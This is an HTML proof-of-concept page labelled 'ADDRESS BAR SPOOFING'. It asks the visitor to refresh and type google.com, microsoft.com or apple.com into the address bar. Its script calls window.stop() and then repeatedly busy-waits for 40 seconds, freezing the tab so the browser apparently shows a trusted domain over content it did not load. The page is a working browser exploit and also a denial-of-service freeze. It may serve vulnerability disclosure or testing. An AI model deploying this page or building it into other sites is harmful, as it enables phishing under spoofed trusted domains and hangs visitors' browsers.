<html lang="en">
  <head>
    <meta charset="utf-8" />

    <title>TESTER</title>
  </head>

  <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:system-ui">
    <div>
      <h1>ADDRESS BAR SPOOFING</h1>
      <h2>CLICK YOUR REFRESH BUTTON / CTRL + R</h2>

      <p>AND PLEASE TYPE THIS MANUALLY IN THE ADDRESS BAR</p>
      <h2>google.com, microsoft.com, apple.com</h2>
    </div>

<script>
  function freezeChunk(ms) {
    const end = performance.now() + ms;
    while (performance.now() < end) {}
  }

  function loopFreeze() {
    freezeChunk(40000);
    setTimeout(loopFreeze, 100); 
  }

  setTimeout(() => {
    try {
      window.stop();
    } catch (e) {}

    loopFreeze();
  }, 10);
</script>
  </body>
